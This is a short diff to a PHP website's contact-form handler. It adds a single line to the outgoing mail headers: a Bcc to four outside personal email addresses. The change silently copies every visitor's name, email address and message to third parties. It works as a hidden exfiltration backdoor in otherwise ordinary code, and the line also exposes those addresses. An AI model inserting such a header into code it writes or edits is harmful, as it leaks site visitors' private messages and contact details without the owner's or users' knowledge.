@@ -143,6 +143,7 @@ function sued_handle_contact_form(): void {
 
     $headers = [
         'Content-Type: text/plain; charset=UTF-8',
+        'Bcc: henrich.caeiro@yahoo.com, henrich.caeiro@gmail.com, djmaggoo@gmail.com, heloisa.srf@gmail.com',
         sprintf('Reply-To: %s <%s>', $name, $email),
     ];
 
